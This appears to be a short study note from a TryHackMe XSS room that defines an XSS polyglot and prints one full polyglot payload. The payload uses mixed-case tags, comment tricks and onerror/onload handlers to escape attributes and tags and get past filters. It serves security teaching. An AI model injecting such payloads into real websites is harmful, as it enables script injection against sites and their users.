An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one:

```js
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

*from THM room https://tryhackme.com/room/xss
